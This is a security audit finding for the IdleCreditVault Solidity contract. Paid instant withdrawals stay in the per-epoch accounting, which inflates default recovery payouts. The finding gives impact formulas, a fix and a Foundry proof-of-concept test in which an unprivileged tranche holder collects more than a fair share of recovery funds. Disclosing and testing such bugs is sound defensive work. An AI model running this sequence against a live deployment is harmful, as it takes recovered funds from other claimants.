### Title
Claimed instant withdrawals remain in epoch recovery accounting and inflate default payouts - ([File: contracts/strategies/idle/IdleCreditVault.sol])

### Summary

`claimInstantWithdrawRequest` pays and clears a user's aggregate instant-withdrawal balance, but does not clear `instantWithdrawsRequestsByEpoch[_user][epoch]` or decrement `instantWithdrawClaimsByEpoch[epoch]`. [1](#0-0)  If another instant request remains pending when borrower recovery is finalized, the stale already-paid amount is included again in `defaultPendingClaimBasis` and is also treated as strategy-held prefunded reserve. [2](#0-1) [3](#0-2) 

### Finding Description

An instant request adds both per-user/per-epoch basis and epoch-wide claim basis, while `pendingInstantWithdraws` tracks only the unfunded remainder. [4](#0-3)  `collectInstantWithdrawFunds` correctly decrements only that unfunded remainder when the CDO funds the requests. [5](#0-4)  The later user claim burns the receipt and transfers the funded amount, but leaves both epoch accounting mappings unchanged. [1](#0-0) 

If a subsequent instant request keeps `pendingInstantWithdraws` nonzero in the same strategy epoch, default finalization includes the stale paid amount in `instantWithdrawClaimsByEpoch[epochNumber]` and calculates it as prefunded reserve even though those underlyings were already transferred to the first claimant. [6](#0-5) [3](#0-2)  This inflates `recoveryPrice` without adding corresponding cash, and a genuine pending instant claimant can then receive the inflated payout from `_transferDefaultRecovery`. [7](#0-6) [8](#0-7) 

### Impact Explanation

An unprivileged tranche holder can create the pending instant request that activates the stale epoch basis, then claim early and receive more recovery than its fair haircutted amount. The stale claimant's own default claim can additionally revert because `_claimDefaultedInstantWithdrawRequest` subtracts the stale basis from an aggregate balance that was already cleared. [9](#0-8) 

For true active basis `T`, attacker's pending instant basis `X`, stale paid amount `W`, and actual recovered cash `R`, the intended price is approximately `R / (T + X)`, while finalization uses:

```solidity
recoveryPrice' = (R + W) / (T + X + W)
```

For `R < T + X`, `recoveryPrice' > R / (T + X)`. The attacker's excess payout is:

```solidity
excess = X * W * (T + X - R) / ((T + X) * (T + X + W))
```

That excess is paid from real recovery cash and leaves insufficient underlying for later recovery claimants.

### Likelihood Explanation

The sequence requires instant withdrawals to be enabled, a funded instant claim, and another pending instant request in the same strategy epoch before borrower default recovery is finalized. Those actions are available to KYC-passing tranche holders and honest manager/borrower epoch calls; the attacker does not need a privileged role. The bug is not prevented by the existing default guard because `defaultPendingClaimBasis` deliberately includes current-epoch instant basis whenever `pendingInstantWithdraws` is nonzero. [2](#0-1) 

### Recommendation

Make funded instant claims remove their per-epoch accounting as well as the aggregate receipt balance. In particular, a successful `claimInstantWithdrawRequest` should clear `instantWithdrawsRequestsByEpoch[_user][requestEpoch]` and decrement `instantWithdrawClaimsByEpoch[requestEpoch]` for every funded receipt being paid. Because claims can span request epochs, store each user's instant-request epochs or maintain a separate funded-receipt ledger rather than deriving claimable epoch basis from the aggregate mapping. Add a regression test that funds and claims an instant withdrawal, creates a second pending instant request in the same epoch, finalizes recovery, and asserts that the first claimed amount contributes neither to `defaultPendingClaimBasis` nor `_defaultPrefundedInstantReserve`.

### Proof of Concept

The following Foundry test shape is reproducible in the existing `IdleCreditVault.t.sol` harness:

```solidity
function testClaimedInstantWithdrawInflatesRecovery() external {
  address staleUser = makeAddr('stale-instant-user');
  address attacker = makeAddr('pending-instant-user');

  uint256 staleAmount = 10_000 * ONE_SCALE;
  uint256 attackAmount = 1_000 * ONE_SCALE;

  // Seed two allowed lenders and configure an APR decrease so requests become instant.
  _depositWithUser(staleUser, staleAmount, true);
  _depositWithUser(attacker, attackAmount, true);
  _configureAprDropForInstantWithdraw();

  // Epoch N: staleUser requests instant withdrawal.
  vm.prank(staleUser);
  cdoEpoch.requestWithdraw(0, address(AAtranche));

  // Honest manager funds it after the instant deadline.
  vm.warp(block.timestamp + cdoEpoch.instantWithdrawDelay());
  vm.prank(manager);
  cdoEpoch.getInstantWithdrawFunds();

  // staleUser is paid, but epoch accounting is not cleared.
  vm.prank(staleUser);
  cdoEpoch.claimInstantWithdrawRequest();

  IdleCreditVault vault = IdleCreditVault(address(strategy));
  uint256 epoch = vault.epochNumber();
  assertEq(vault.instantWithdrawsRequests(staleUser), 0);
  assertEq(vault.instantWithdrawsRequestsByEpoch(staleUser, epoch), staleAmount);
  assertEq(vault.instantWithdrawClaimsByEpoch(epoch), staleAmount);

  // Same epoch: attacker creates a real unfunded pending instant request.
  vm.prank(attacker);
  cdoEpoch.requestWithdraw(0, address(AAtranche));
  assertEq(vault.pendingInstantWithdraws(), attackAmount);
  assertEq(
    vault.instantWithdrawClaimsByEpoch(epoch),
    staleAmount + attackAmount
  );

  // Borrower fails to fund the pending instant amount and recovery is finalized.
  _checkDefault();

  uint256 trueBasis = cdoEpoch.getContractValue() + attackAmount;
  uint256 recovered = trueBasis * 70e16 / ONE_TRANCHE;

  deal(defaultUnderlying, manager, recovered);
  vm.startPrank(manager);
  IERC20Detailed(defaultUnderlying).approve(address(strategy), recovered);
  cdoEpoch.finalizeDefault(recovered, manager);
  vm.stopPrank();

  // Stale already-paid funds were counted as prefunded reserve, so the price is
  // higher than recovered / trueBasis.
  uint256 fairPrice = recovered * ONE_TRANCHE / trueBasis;
  assertGt(vault.defaultRecoveryPrice(), fairPrice);

  uint256 balPre = IERC20Detailed(defaultUnderlying).balanceOf(attacker);
  vm.prank(attacker);
  cdoEpoch.claimInstantWithdrawRequest();

  uint256 payout = IERC20Detailed(defaultUnderlying).balanceOf(attacker) - balPre;
  assertGt(payout, attackAmount * fairPrice / ONE_TRANCHE);
}
```

The concrete helper that creates the APR drop can follow the existing instant-withdrawal tests: set `instantWithdrawAprDelta`, lower the current unscaled APR below `lastEpochApr`, then call `requestWithdraw` during the running epoch.

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L366-374)
```text
    instantWithdrawsRequests[_user] += _amount;
    uint256 currentEpoch = epochNumber;
    // we record both per-user (old, kept for compatibility) and per-epoch so on
    // finalization we can distinguish "default-epoch pending instant receipts"
    // from old funded instant receipts.
    instantWithdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    instantWithdrawClaimsByEpoch[currentEpoch] += _amount;
    // increase the total instant withdraw requests
    pendingInstantWithdraws += _amount;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L387-392)
```text
    uint256 amount = instantWithdrawsRequests[_user];
    // burn strategy tokens from user
    _burn(_user, amount);

    instantWithdrawsRequests[_user] = 0;
    _transferFundedClaim(_user, amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L398-402)
```text
  function collectInstantWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    if (_amount == 0) return;
    pendingInstantWithdraws -= _amount;
    underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L644-648)
```text
  function defaultPendingClaimBasis() public view returns (uint256 basis) {
    basis = pendingWithdraws;
    if (pendingInstantWithdraws != 0) {
      basis += instantWithdrawClaimsByEpoch[epochNumber];
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L688-692)
```text
    uint256 recoveryPrice = reserveAmount * RECOVERY_FULL / totalBasis;

    defaultRecoveryFinalized = true;
    defaultRecoveryReserve = reserveAmount;
    defaultRecoveryPrice = recoveryPrice;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L716-722)
```text
  function _defaultPrefundedInstantReserve() internal view returns (uint256 prefundedReserve) {
    uint256 pendingInstant = pendingInstantWithdraws;
    if (pendingInstant == 0) return prefundedReserve;
    uint256 instantBasis = instantWithdrawClaimsByEpoch[epochNumber];
    if (instantBasis > pendingInstant) {
      prefundedReserve = instantBasis - pendingInstant;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L843-855)
```text
    uint256 defaultEpoch = defaultRecoveryEpoch;
    claimBasis = instantWithdrawsRequestsByEpoch[_user][defaultEpoch];
    if (claimBasis == 0) return claimBasis;

    instantWithdrawsRequestsByEpoch[_user][defaultEpoch] = 0;
    instantWithdrawsRequests[_user] -= claimBasis;
    uint256 pending = pendingInstantWithdraws;
    // `pendingInstantWithdraws` is only the unfunded remainder. If this user's claim is larger,
    // the extra amount was already counted as prefunded reserve during default finalization.
    pendingInstantWithdraws = claimBasis >= pending ? 0 : pending - claimBasis;
    instantWithdrawClaimsByEpoch[defaultEpoch] -= claimBasis;
    _burn(_user, claimBasis);
    _transferDefaultRecovery(_user, (claimBasis * defaultRecoveryPrice) / RECOVERY_FULL);
```
